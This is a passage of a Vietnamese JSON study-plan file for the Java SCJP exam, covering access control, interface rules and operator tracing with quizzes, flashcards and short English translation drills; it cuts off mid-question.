          "wrongThinking": "Nghĩ rằng dấu hoa thị * import toàn bộ cây thư mục.",
          "correctRule": "Dấu * chỉ đại diện cho tất cả các class nằm TRỰC TIẾP trong package đó, hoàn toàn không bao gồm các class thuộc package con.",
          "code": "import java.awt.*;\n// Button b; // OK (nằm trong java.awt)\n// ActionEvent e; // COMPILE ERROR: Không tìm thấy class ActionEvent (nó nằm trong java.awt.event.*)!",
          "miniCheck": "Luôn nhớ package trong Java không có quan hệ kế thừa phân cấp, java.util và java.util.concurrent là 2 package độc lập hoàn toàn."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Phạm vi truy cập Class và Package",
          "questions": [
            {
              "q": "Một top-level class (class cấp cao nhất, không phải inner class) trong Java có thể khai báo với những access modifier nào?",
              "ans": "Chỉ có 2 mức: `public` hoặc `default` (package-private). Không được dùng `private` hoặc `protected` cho top-level class."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Nguyên tắc package và import",
          "questions": [
            {
              "q": "Nếu import `import java.util.*;` và `import java.sql.*;`, khi khai báo `Date d = new Date();` thì compiler xử lý thế nào?",
              "ans": "Bị Compile Error: `reference to Date is ambiguous`. Cả `java.util.Date` và `java.sql.Date` đều khớp, lập trình viên buộc phải chỉ định tên đầy đủ gói (fully-qualified name) hoặc import đích danh một class."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace quyền truy cập package-private",
          "questions": [
            {
              "q": "Cho 2 file trong 2 package khác nhau:\n```java\npackage pkgA;\npublic class A { void msg() { System.out.println(\"A\"); } }\n\npackage pkgB;\nimport pkgA.A;\npublic class B { public static void main(String[] args) { new A().msg(); } }\n```\nKết quả khi biên dịch là gì?",
              "ans": "Compile Error tại file B: Phương thức `msg()` trong class A có phạm vi `default` (package-private), chỉ truy cập được trong cùng package `pkgA`. Class B nằm ở package `pkgB` nên không thể gọi `msg()`."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy thứ tự khai báo trong file Java",
          "questions": [
            {
              "q": "Một source file `.java` có thể chứa tối đa bao nhiêu `public` class và thứ tự bắt buộc của `package`, `import`, `class` là gì?",
              "ans": "Chỉ được chứa tối đa 1 `public` class (và tên file phải trùng tên class này). Thứ tự bắt buộc: 1) `package` (nếu có) -> 2) `import` (nếu có) -> 3) `class / interface` definition."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Static import conflict",
          "questions": [
            {
              "q": "Khi dùng `import static java.lang.Math.PI;` và trong chính class đó khai báo `public static final double PI = 3.14;`, khi gọi `System.out.println(PI);` giá trị nào được ưu tiên?",
              "ans": "Giá trị biến `PI` khai báo trực tiếp trong class hiện tại được ưu tiên (shadowing) và in ra 3.14. Static import chỉ đóng vai trò dự phòng nếu không tìm thấy biến cùng tên trong scope hiện tại."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_3_1",
          "q": "Một file Java có tên `Test.java` chứa các dòng sau:\n```java\npackage mypack;\nimport java.io.*;\nclass A {}\nclass B {}\n```\nFile này có biên dịch hợp lệ không?",
          "options": [
            "Hợp lệ hoàn toàn và sinh ra A.class và B.class",
            "Lỗi biên dịch vì tên file Test.java không trùng với class A hay class B",
            "Lỗi biên dịch vì file bắt buộc phải có ít nhất 1 public class",
            "Lỗi biên dịch vì có nhiều hơn 1 class trong cùng 1 file"
          ],
          "correct": 0,
          "exp": "Một file Java không bắt buộc phải có public class. Khi không có public class nào, tên file có thể đặt tùy ý và file có thể chứa bao nhiêu class default tùy thích."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Bốn cấp độ truy cập (Access Modifiers) trong Java theo thứ tự thu hẹp dần?",
          "a": "public (mọi nơi) > protected (cùng package + lớp con khác package qua kế thừa) > default/package-private (chỉ trong cùng package) > private (chỉ trong cùng class).",
          "trap": "Lớp con ở package khác chỉ truy cập được member `protected` thông qua con trỏ kế thừa `this`, không truy cập được qua con trỏ đối tượng cha `new Parent().protectedMember`!"
        },
        {
          "q": "Top-level class (class cấp cao nhất trong file .java) có thể dùng modifier nào?",
          "a": "Chỉ được dùng 2 access modifier: `public` hoặc `default` (không ghi gì). Tuyệt đối không được dùng `private` hoặc `protected` cho top-level class.",
          "trap": "Trong 1 file .java chỉ được phép có tối đa 1 public class trùng tên file, nhưng có thể có nhiều default class."
        },
        {
          "q": "Thứ tự các thành phần hợp lệ trong một file mã nguồn Java (.java)?",
          "a": "Thứ tự bắt buộc: 1. `package` declaration (tối đa 1) -> 2. `import` statements -> 3. `class` / `interface` declarations.",
          "trap": "Package và import sai thứ tự sẽ bị Compile Error ngay dòng đầu tiên."
        }
      ],
      "dailyEnglish": [
        {
          "id": 7,
          "vi": "(Lấy số ngày nghỉ của một tháng)",
          "en": "Get number of days off of a month"
        },
        {
          "id": 8,
          "vi": "(Lấy các tháng của năm)",
          "en": "Get months of year"
        },
        {
          "id": 9,
          "vi": "(Lấy tất cả dữ liệu về ngày nghỉ của các tháng và các năm trong database)",
          "en": "Get all days off of months and years from database"
        },
        {
          "id": 10,
          "vi": "Xóa tất cả ngày nghỉ của một tháng",
          "en": "Delete all days off of a month"
        },
        {
          "id": 11,
          "vi": "(Trả về true nếu thành công hoặc false nếu thất bại",
          "en": "Return \"true\" on success or \"false\" on failure"
        }
      ],
      "chapter": "Chapter 2: Declarations & Access Control (Phần 1)"
    },
    "4": {
      "day": 4,
      "week": 1,
      "title": "Chapter 2: Declarations & Access Control (Phần 2)",
      "topics": [
        "Non-access modifiers: static, final, abstract, strictfp, native",
        "Interface declaration: constants (public static final ngầm định), methods (public abstract ngầm định)",
        "Abstract class vs Interface rules"
      ],
      "tasks": [
        "Kiểm tra các bẫy: final abstract method có hợp lệ không?",
        "Interface variable có thể là private được không?",
        "Làm 25 câu TestKing Ch2"
      ],
      "englishDrill": [
        {
          "id": 10,
          "vi": "Xóa tất cả ngày nghỉ của một tháng",
          "en": "Delete all days off of a month"
        },
        {
          "id": 11,
          "vi": "(Trả về true nếu thành công hoặc false nếu thất bại",
          "en": "Return \"true\" on success or \"false\" on failure"
        },
        {
          "id": 12,
          "vi": "(Đăng ký hoặc update ngày nghỉ của một tháng)",
          "en": "Register or update days off of a month"
        },
        {
          "id": 13,
          "vi": "(Lấy danh sách ngày nghỉ của một tháng)",
          "en": "Get list of days off of a month"
        },
        {
          "id": 14,
          "vi": "(Duyệt qua các ngày của tháng)",
          "en": "Iterate days of the month"
        }
      ],
      "summary": "Non-access Modifiers (static, final, abstract) và Quy tắc Interface.",
      "coreTheory": "\n### 1. Non-access Modifiers\n- `final`: Biến final không thể thay đổi giá trị; Method final không thể bị override; Class final không thể bị kế thừa (extends).\n- `abstract`: Class abstract không thể tạo đối tượng trực tiếp; Method abstract không có thân hàm `{}`.\n- Không thể kết hợp `final` với `abstract` (vì chúng mâu thuẫn hoàn toàn về mục đích kế thừa).\n\n### 2. Quy tắc Interface\n- Mọi biến trong Interface đều ngầm định là **`public static final`** (hằng số).\n- Mọi phương thức trong Interface (Java 7 trở về trước) ngầm định là **`public abstract`**.\n- Class implement interface override method bắt buộc phải ghi rõ `public` (vì không được thu hẹp quyền truy cập).\n",
      "codeSnippet": "interface Flyable {\n    int SPEED = 100; // Ngầm định: public static final int SPEED = 100;\n    void fly();      // Ngầm định: public abstract void fly();\n}\n\nclass Bird implements Flyable {\n    // void fly() {} // COMPILE ERROR: Cannot reduce visibility, was public!\n    public void fly() {\n        System.out.println(\"Flying at \" + SPEED);\n    }\n}",
      "traps": [
        "Quên từ khóa `public` khi implement phương thức của Interface.",
        "Khai báo `final abstract class` là lỗi biên dịch vì mâu thuẫn."
      ],
      "quickQuiz": [
        {
          "q": "Biến trong interface có thể là `private` không?",
          "a": "Không, luôn là public static final."
        },
        {
          "q": "Tại sao không thể khai báo `final abstract` cho 1 method?",
          "a": "abstract bắt buộc phải override, còn final cấm override -> Mâu thuẫn!"
        }
      ],
      "estimatedTime": "3h 30m",
      "difficulty": "⭐⭐⭐",
      "priority": "🔴 MUST KNOW (Trọng Tâm SCJP & TestKing)",
      "source": "SCJP Chapter 2 (Ch02.pdf) & TestKing",
      "objectives": [
        "Làm chủ 7 Non-access Modifiers: static, final, abstract, strictfp, native, transient, volatile.",
        "Nắm vững các cặp Modifier tương khắc nhau (Illegal Combinations): final abstract, private abstract, static abstract.",
        "Quy tắc bất biến của Interface: Mọi field ngầm định là 'public static final', mọi method ngầm định là 'public abstract'.",
        "Khác biệt giữa biến static (Class variable - nạp 1 lần duy nhất) và biến instance."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "partA",
          "title": "Part A: Các Non-Access Modifiers & Quy Tắc Tương Khắc",
          "sourceRef": "SCJP Objective 1.1 & 1.2 (Ch02.pdf, Page 26-38)",
          "theory": "\n#### 1. Các Non-Access Modifiers phổ biến:\n- **`final`**:\n  - Biến final: Hằng số, chỉ được gán giá trị 1 lần duy nhất.\n  - Phương thức final: Không cho phép lớp con Override.\n  - Lớp final: Không cho phép bất kỳ ai kế thừa (ví dụ class `String`, `Math`, các wrapper class).\n- **`abstract`**:\n  - Lớp abstract: Không thể khởi tạo trực tiếp bằng từ khóa `new`.\n  - Phương thức abstract: Chỉ có phần khai báo, KHÔNG CÓ THÂN HÀM (kết thúc bằng dấu chấm phẩy `;`). Bắt buộc lớp con đầu tiên là concrete class phải Override.\n- **`static`**:\n  - Thuộc tính/phương thức thuộc về **toàn bộ Class** chứ không thuộc về từng instance riêng lẻ. Được cấp phát bộ nhớ ngay khi Class được nạp.\n- **`transient`**: Đánh dấu thuộc tính **KHÔNG ĐƯỢC serialize** (ghi ra file hoặc truyền qua mạng). Khi deserialize, nó nhận giá trị default.\n- **`volatile`**: Báo cho JVM biết biến này có thể bị sửa đổi bởi nhiều luồng đồng thời, buộc các luồng phải đọc/ghi trực tiếp từ RAM chính (Main Memory) thay vì dùng CPU Cache.\n\n#### 2. ⚠️ Các Cặp Modifier TƯƠNG KHẮC BẮT BUỘC NHỚ (Compile Error):\n1. **`final abstract`**: Hoàn toàn mâu thuẫn! `final` cấm sửa/cấm kế thừa, trong khi `abstract` bắt buộc phải có con kế thừa để hoàn thiện.\n2. **`private abstract`**: `abstract` bắt con phải thấy để override, nhưng `private` lại giấu tiệt không cho con thấy!\n3. **`static abstract`**: Phương thức static không thể override (chỉ có thể hiding), trong khi abstract đòi hỏi dynamic dispatch ở runtime.\n",
          "code": "abstract class Shape {\n    final int BORDER_WIDTH = 2; // Hợp lệ: Hằng số\n    abstract void draw(); // Hợp lệ: Phương thức trừu tượng\n    \n    // final abstract void test(); // COMPILE ERROR: illegal combination of modifiers: abstract and final!\n    // private abstract void hide(); // COMPILE ERROR: illegal combination of modifiers: abstract and private!\n    // static abstract void run(); // COMPILE ERROR: illegal combination of modifiers: abstract and static!\n}"
        },
        {
          "id": "partB",
          "title": "Part B: Quy Tắc Toàn Diện Về Interface Trong Java",
          "sourceRef": "SCJP Objective 1.3 (Ch02.pdf, Page 40-52)",
          "theory": "\n### 1. Thuộc tính (Constants) trong Interface:\n- Mọi biến khai báo trong interface **LUÔN LUÔN LÀ `public static final`** ngầm định, bất kể bạn có gõ các từ này ra hay không!\n- Do là `final`, bạn **BẮT BUỘC PHẢI KHỞI TẠO GIÁ TRỊ NGAY LẬP TỨC** khi khai báo.\n- Khai báo biến `private`, `protected`, hoặc không gán giá trị $\\rightarrow$ **COMPILE ERROR NGAY LẬP TỨC**.\n\n### 2. Phương thức trong Interface (Java 7 trở về trước):\n- Mọi phương thức trong interface **LUÔN LUÔN LÀ `public abstract`** ngầm định.\n- Không được phép có thân hàm `{}` (trừ `default` và `static` từ Java 8).\n- Không được phép khai báo `protected`, `private`, `final`, `static` (trước Java 8).\n\n### 3. Cạm bẫy kế thừa Interface:\n- Khi một Class `implements` Interface, phương thức override ở class con **BẮT BUỘC PHẢI KHAI BÁO TỪ KHÓA `public`**!\n- Lý do: Method trong interface ngầm định là `public`. Nếu class con viết `void doWork() {}` (không ghi modifier tức là `default`), compiler sẽ báo lỗi: **\"Cannot reduce the visibility of the inherited method from Interface\"** (vi phạm quy tắc quyền truy cập con không được hẹp hơn cha).\n",
          "code": "interface Movable {\n    int SPEED = 100; // Ngầm định: public static final int SPEED = 100;\n    void move();     // Ngầm định: public abstract void move();\n}\n\nclass Car implements Movable {\n    // void move() {} // COMPILE ERROR: Phải là public!\n    public void move() {\n        System.out.println(\"Moving at \" + SPEED);\n    }\n}"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d4_1",
          "level": "Medium",
          "question": "Xét interface và class sau, điều gì xảy ra khi biên dịch?",
          "code": "interface Bounceable {\n    int count = 10;\n    void bounce();\n}\npublic class Ball implements Bounceable {\n    public void bounce() {\n        // count = 20; // Dòng 1\n        System.out.println(count); // Dòng 2\n    }\n    public static void main(String[] args) {\n        new Ball().bounce();\n    }\n}",
          "options": [
            "In ra 10 nếu Dòng 1 bị comment, nếu mở Dòng 1 sẽ bị Compile Error vì count là final",
            "Biên dịch lỗi tại khai báo int count = 10 vì thiếu từ khóa public",
            "In ra 20",
            "Lỗi biên dịch tại class Ball vì chưa override đầy đủ phương thức"
          ],
          "correctIndex": 0,
          "explanation": "Trong interface, biến `count` ngầm định là `public static final`. Vì là `final`, nó là hằng số không thể gán lại giá trị mới (Dòng 1 bị lỗi: cannot assign a value to final variable count). Dòng 2 đọc giá trị hằng số 10 hoàn toàn hợp lệ."
        }
      ],
      "examTraps": [
        {
          "trap": "Quên ghi từ khóa 'public' khi override phương thức từ Interface",
          "whyPeopleWrong": "Thấy interface viết 'void run();' nên ở class con cũng viết 'void run() {}'.",
          "wrongThinking": "Tưởng rằng phương thức trong interface không ghi gì là quyền default (package-private).",
          "correctRule": "Mọi phương thức trong interface ngầm định là 'public abstract'. Ở class con bắt buộc phải ghi tường minh từ khóa 'public', nếu không sẽ bị lỗi hạ thấp quyền truy cập (cannot reduce visibility)!",
          "code": "interface Doable { void doIt(); }\nclass Imp implements Doable {\n    // void doIt() {} // COMPILE ERROR: Cannot reduce visibility!\n    public void doIt() {} // OK CHUẨN XÁC\n}",
          "miniCheck": "Bất kỳ class nào implements interface, hãy soi ngay xem các phương thức override có chữ 'public' hay chưa!"
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Non-access Modifiers",
          "questions": [
            {
              "q": "Biến trong interface mặc định có những modifier ngầm định nào?",
              "ans": "Luôn luôn là `public static final` dù có ghi hay không."
            },
            {
              "q": "Từ khóa `transient` dùng để làm gì trong Java?",
              "ans": "Đánh dấu biến instance không được tuần tự hóa (serialized). Khi object được ghi ra file/mạng qua `ObjectOutputStream`, giá trị của biến `transient` sẽ bị bỏ qua và nhận giá trị mặc định lúc deserialize."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Tính mâu thuẫn giữa các Modifiers",
          "questions": [
            {
              "q": "Tại sao một method không thể đồng thời là `abstract` và `static`?",
              "ans": "Phương thức `abstract` không có thân hàm và bắt buộc lớp con phải override thông qua cơ chế đa hình runtime. Trong khi đó phương thức `static` thuộc về class, liên kết tại thời điểm compile (static binding) và không thể override. Do đó kết hợp `abstract static` là mâu thuẫn cú pháp."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace giá trị biến static và final",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nclass Counter {\n    static int count = 0;\n    final int id;\n    Counter() { id = ++count; }\n}\npublic class Test {\n    public static void main(String[] args) {\n        Counter c1 = new Counter();\n        Counter c2 = new Counter();\n        System.out.println(c1.id + \" \" + c2.id + \" \" + Counter.count);\n    }\n}\n```\nKết quả in ra màn hình là gì?",
              "ans": "In ra: `1 2 2`. Giải thích: `count` là biến `static` dùng chung trên vùng nhớ Metaspace/Heap. `c1` tạo ra tăng `count` lên 1 và gán `c1.id = 1`. `c2` tạo ra tăng `count` lên 2 và gán `c2.id = 2`. Biến `Counter.count` lúc này bằng 2."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy gán lại biến final reference",
          "questions": [
            {
              "q": "Đoạn code sau có hợp lệ không?\n```java\nfinal StringBuilder sb = new StringBuilder(\"Java\");\nsb.append(\" 8\");\nsb = new StringBuilder(\"Python\");\n```",
              "ans": "Dòng `sb.append(\" 8\");` hoàn toàn hợp lệ vì nội dung object bên trong Heap thay đổi. Dòng `sb = new StringBuilder(\"Python\");` gây Compile Error: `cannot assign a value to final variable sb` (từ khóa final cấm trỏ tham chiếu sang object khác)."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Blank final variable initialization",
          "questions": [
            {
              "q": "Một biến `final int x;` không khởi tạo tại nơi khai báo (blank final) thì BẮT BUỘC phải được gán giá trị ở những nơi nào?",
              "ans": "Nếu là biến instance: Bắt buộc phải được gán duy nhất 1 lần trong Instance Initialization Block hoặc trong TẤT CẢ các constructor của class. Nếu là biến `static final`: Bắt buộc phải gán trong Static Initialization Block."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_4_1",
          "q": "Tổ hợp modifier nào sau đây là HỢP LỆ trong Java?",
          "options": [
            "public final class MyClass {}",
            "final abstract class MyClass {}",
            "private abstract void doWork();",
            "static abstract void calculate();"
          ],
          "correct": 0,
          "exp": "'public final' là tổ hợp hoàn toàn hợp lệ (class công khai và không cho kế thừa như java.lang.String). Các tổ hợp còn lại đều xung đột trực tiếp với abstract."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Ý nghĩa của từ khóa `final` khi áp dụng cho Class, Method và Variable?",
          "a": "- Final class: Không thể bị kế thừa (vd: String, Integer).\n- Final method: Không thể bị Override bởi lớp con.\n- Final variable: Hằng số, chỉ gán giá trị được đúng 1 lần.",
          "trap": "Biến tham chiếu final (`final List list = new ArrayList()`) chỉ cấm gán con trỏ sang object khác, nhưng nội dung bên trong object vẫn thay đổi được bình thường (`list.add(\"A\")` hợp lệ)!"
        },
        {
          "q": "Những modifier nào TUYỆT ĐỐI KHÔNG ĐƯỢC đi cùng với `abstract`?",
          "a": "`abstract` KHÔNG THỂ đi cùng: `final` (mâu thuẫn kế thừa), `private` (lớp con không thấy để override), `static` (static thuộc về class, không có đa hình runtime), `native` hoặc `synchronized`.",
          "trap": "Đề thi hay gài `public abstract final void doWork();` -> Compile Error ngay lập tức."
        },
        {
          "q": "Static block được thực thi vào thời điểm nào trong vòng đời ứng dụng?",
          "a": "Static block thực thi duy nhất 1 lần khi Class được nạp (loaded) vào bộ nhớ JVM bởi ClassLoader, trước khi bất kỳ constructor nào hoặc instance block nào chạy.",
          "trap": "Tạo 100 instance thì static block vẫn chỉ chạy duy nhất 1 lần đầu tiên."
        }
      ],
      "dailyEnglish": [
        {
          "id": 10,
          "vi": "Xóa tất cả ngày nghỉ của một tháng",
          "en": "Delete all days off of a month"
        },
        {
          "id": 11,
          "vi": "(Trả về true nếu thành công hoặc false nếu thất bại",
          "en": "Return \"true\" on success or \"false\" on failure"
        },
        {
          "id": 12,
          "vi": "(Đăng ký hoặc update ngày nghỉ của một tháng)",
          "en": "Register or update days off of a month"
        },
        {
          "id": 13,
          "vi": "(Lấy danh sách ngày nghỉ của một tháng)",
          "en": "Get list of days off of a month"
        },
        {
          "id": 14,
          "vi": "(Duyệt qua các ngày của tháng)",
          "en": "Iterate days of the month"
        }
      ],
      "chapter": "Chapter 2: Declarations & Access Control (Phần 2)"
    },
    "5": {
      "day": 5,
      "week": 1,
      "title": "Chapter 3: Operators & Assignments",
      "topics": [
        "Operator Precedence & Associativity",
        "Prefix vs Postfix (++x vs x++)",
        "Short-circuit operators (&&, ||) vs Bitwise (&, |)",
        "Bitwise shift: <<, >> (signed), >>> (unsigned)",
        "Ternary operator ? :",
        "instanceof operator",
        "== vs equals() cơ bản"
      ],
      "tasks": [
        "Tính tay các biểu thức phức tạp: int x = 5; int y = x++ + ++x;",
        "Hiểu rõ vì sao (1 > 2 && ++x > 0) không làm tăng x",
        "Làm 30 câu TestKing Ch3"
      ],
      "englishDrill": [
        {
          "id": 13,
          "vi": "(Lấy danh sách ngày nghỉ của một tháng)",
          "en": "Get list of days off of a month"
        },
        {
          "id": 14,
          "vi": "(Duyệt qua các ngày của tháng)",
          "en": "Iterate days of the month"
        },
        {
          "id": 15,
          "vi": "(Kiểm tra nếu I bằng với  listDayOff.length - 1 thì không nối \",\", ngược lại thì nối \",\" )",
          "en": "Check if I is equal to listDayOff.length minus 1, do not append \",\" else append \",\""
        },
        {
          "id": 16,
          "vi": "(Nếu ngày của tháng có dữ liệu bằng \"*\" thì tăng biến countDayOff lên 1 đơn vị)",
          "en": "if day of month has data containing \"*\", increase countDayOff by 1"
        },
        {
          "id": 17,
          "vi": "(Export tất cả các tháng của năm hiện tại trên màn hình)",
          "en": "Export data of all months of current year on screen"
        }
      ],
      "summary": "Operators & Assignments: Precedence, Prefix/Postfix, Bitwise vs Short-Circuit.",
      "coreTheory": "\n### 1. Toán tử Tăng/Giảm Prefix vs Postfix\n- `++x`: Tăng x trước, sau đó trả về giá trị mới.\n- `x++`: Trả về giá trị hiện tại của x trước, sau đó mới tăng x trong ô nhớ.\n- Bẫy: `x = x++;` $\\rightarrow$ x không hề thay đổi giá trị vì phép gán ghi đè giá trị cũ!\n\n### 2. Short-Circuit (&&, ||) vs Bitwise (&, |)\n- `&&` và `||`: Nếu vế trái đã quyết định được kết quả (`false` với `&&`, `true` với `||`), JVM sẽ **bỏ qua không chạy vế phải**!\n- `&` và `|`: Luôn luôn thực thi cả hai vế.\n- Dịch bit: `>>` dịch phải giữ dấu, `>>>` dịch phải không dấu (luôn chèn bit 0 bên trái).\n",
      "codeSnippet": "int a = 5;\nboolean res = (a++ > 5) && (++a > 5);\n// a++ > 5 là 5 > 5 (false). Sau đó a = 6.\n// Do vế trái false, vế phải (++a > 5) KHÔNG ĐƯỢC CHẠY!\nSystem.out.println(a); // In ra 6!\n\nint x = 1;\nx = x++;\nSystem.out.println(x); // In ra 1!",
      "traps": [
        "Vế phải của toán tử short-circuit && hoặc || chứa phép tăng ++x thường không được chạy.",
        "Phép cộng byte: `byte c = a + b;` bị lỗi vì tự động nâng kiểu lên int."
      ],
      "quickQuiz": [
        {
          "q": "Kết quả của `int x = 2; int y = x++ + ++x;` là bao nhiêu?",
          "a": "x = 4, y = 6 (2 + 4 = 6)"
        },
        {
          "q": "Toán tử `>>>` dịch bit gì sang bên trái?",
          "a": "Luôn luôn chèn bit 0 (unsigned shift)"
        }
      ],
      "estimatedTime": "3h 30m",
      "difficulty": "⭐⭐⭐",
      "priority": "🔴 MUST KNOW (Trọng Tâm TestKing)",
      "source": "SCJP Chapter 3 (Ch03.pdf) & TestKing",
      "objectives": [
        "Làm chủ toán tử tiền tố (++x, --x) vs hậu tố (x++, x--) trong biểu thức phức hợp.",
        "Phân biệt toán tử đoản mạch Short-Circuit (&&, ||) vs toán tử luận lý Bitwise (&, |).",
        "Hiểu sâu toán tử dịch bit: >> (Signed Right Shift giữ bit dấu) vs >>> (Unsigned Right Shift luôn chèn 0).",
        "Nắm chắc toán tử ba ngôi (Ternary Operator ? :) và toán tử instanceof."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "partA",
          "title": "Part A: Tiền Tố, Hậu Tố & Short-Circuit Operators",
          "sourceRef": "SCJP Objective 3.1 & 3.2 (Ch03.pdf, Page 4-22)",
          "theory": "\n#### 1. Toán tử Tăng/Giảm (++ và --):\n- **Prefix (`++x`)**: Tăng giá trị của `x` lên 1 TRƯỚC, sau đó mới lấy giá trị mới đưa vào tính toán biểu thức.\n- **Postfix (`x++`)**: Lấy giá trị HIỆN TẠI của `x` để đưa vào tính toán biểu thức trước, tính xong toàn bộ mới tăng `x` lên 1.\n\n#### 2. Short-Circuit (&&, ||) vs Bitwise (&, |):\n- **Toán tử Đoản mạch (`&&`)**: Nếu vế trái là `false`, Java **LẬP TỨC DỪNG LẠI** và kết luận biểu thức là `false`. Toàn bộ vế bên phải **HOÀN TOÀN KHÔNG ĐƯỢC THỰC THI**!\n- **Toán tử Đoản mạch (`||`)**: Nếu vế trái là `true`, Java **LẬP TỨC DỪNG LẠI** và kết luận biểu thức là `true`. Vế bên phải không được chạy!\n- **Toán tử Non-short-circuit / Bitwise (`&`, `|`)**: Dù vế trái có là gì, Java **BẮT BUỘC PHẢI CHẠY CẢ 2 VẾ** trái và phải!\n\n#### 3. Toán tử Dịch Bit:\n- `x << 2`: Dịch trái 2 bit (tương đương nhân với $2^2 = 4$).\n- `x >> 1`: Dịch phải có dấu 1 bit (tương đương chia cho 2). Giữ nguyên bit dấu ngoài cùng bên trái (nếu âm thì chèn 1, dương thì chèn 0).\n- `x >>> 1`: Dịch phải **KHÔNG DẤU (Unsigned)**. Luôn luôn chèn bit `0` vào bên trái, biến số âm thành số dương cực lớn!\n",
          "code": "int a = 5;\nint b = 10;\nboolean res = (a++ > 5) && (++b > 10);\n// Giải phẫu:\n// 1. a++ > 5: Lấy a=5 so sánh 5 > 5 -> FALSE. Sau đó a tăng lên 6.\n// 2. Vì vế trái FALSE và dùng && -> BỎ QUA VẾ PHẢI! b giữ nguyên 10!\nSystem.out.println(\"a=\" + a + \", b=\" + b + \", res=\" + res);\n// In ra: a=6, b=10, res=false\n\n// Toán tử instanceof:\nString s = null;\nSystem.out.println(s instanceof String); // In ra FALSE! null không bao giờ là instance của bất kỳ class nào!"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d5_1",
          "level": "Hard",
          "question": "Kết quả in ra của đoạn mã sau là gì?",
          "code": "public class OpTrace {\n    public static void main(String[] args) {\n        int x = 2;\n        int y = 5;\n        if ((x++ == 2) || (y++ == 5)) {\n            x += y;\n        }\n        System.out.println(x + \" \" + y);\n    }\n}",
          "options": [
            "8 5",
            "8 6",
            "7 5",
            "7 6"
          ],
          "correctIndex": 0,
          "explanation": "1. `x++ == 2`: Lấy x=2 so sánh 2 == 2 -> TRUE. Sau đó x tăng lên 3.\n2. Do toán tử là `||` và vế trái đã TRUE, Java lập tức bỏ qua vế phải `(y++ == 5)` -> `y` giữ nguyên giá trị 5!\n3. Vào trong if: `x += y` -> `x = 3 + 5 = 8`.\n4. Kết quả in ra: `8 5`."
        }
      ],
      "examTraps": [
        {
          "trap": "Toán tử instanceof với đối tượng null",
          "whyPeopleWrong": "Tưởng rằng biến khai báo kiểu String có giá trị null thì null instanceof String sẽ là true.",
          "wrongThinking": "Nghĩ rằng kiểu dữ liệu của biến quyết định kết quả instanceof.",
          "correctRule": "Toán tử instanceof kiểm tra kiểu của ĐỐI TƯỢNG THỰC TẾ TRÊN HEAP. Giá trị null không trỏ tới bất kỳ đối tượng nào, do đó 'null instanceof Anything' LUÔN TRẢ VỀ FALSE mà không ném ngoại lệ NullPointerException!",
          "code": "String s = null;\nSystem.out.println(s instanceof String); // In ra: false\nSystem.out.println(s instanceof Object); // In ra: false",
          "miniCheck": "Bất cứ khi nào vế trái của instanceof là null, kết quả chắc chắn là false!"
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Toán tử và độ ưu tiên",
          "questions": [
            {
              "q": "Toán tử `==` khi áp dụng cho hai biến kiểu tham chiếu (Object reference) so sánh điều gì?",
              "ans": "So sánh địa chỉ ô nhớ (identity reference): Trả về `true` nếu cả hai biến cùng trỏ tới chính xác cùng một đối tượng trên Heap."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Ngắn mạch (Short-circuit) vs Non-short-circuit",
          "questions": [
            {
              "q": "Toán tử `&&` khác toán tử `&` như thế nào khi áp dụng cho biểu thức boolean?",
              "ans": "`&&` là toán tử ngắn mạch (short-circuit): Nếu vế trái là `false`, vế phải sẽ KHÔNG được thực thi. Toán tử `&` luôn luôn đánh giá và thực thi cả hai vế bất kể vế trái là gì."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace biểu thức tiền tố và hậu tố",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nint a = 3;\nint b = a++ + ++a * a--;\nSystem.out.println(\"a=\" + a + \", b=\" + b);\n```\nKết quả in ra màn hình là gì?",
              "ans": "In ra: `a=4, b=28`. Giải thích:\n1) `a++` lấy giá trị 3, sau đó `a` tăng lên 4.\n2) `++a` tăng `a` lên 5 và lấy giá trị 5.\n3) `a--` lấy giá trị 5, sau đó `a` giảm xuống 4.\n4) Nhân trước cộng sau: `5 * 5 = 25`.\n5) `b = 3 + 25 = 28`.\n6) Giá trị cuối cùng của `a` là 4."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy short-circuit không thực thi vế phải",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nint x = 10;\nif (x > 5 || ++x > 10) {\n    System.out.println(x);\n}\n```\nKết quả in ra là gì?",
              "ans": "In ra: 10 (không phải 11!). Do `x > 5` (10 > 5) là `true`, toán tử `||` ngắn mạch dừng ngay lập tức, biểu thức `++x > 10` không bao giờ được thực thi, do đó `x` vẫn giữ nguyên giá trị 10."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Toán tử dịch bit unsigned >>>",
          "questions": [
            {
              "q": "Biểu thức `-1 >>> 24` trong Java cho kết quả là bao nhiêu?",
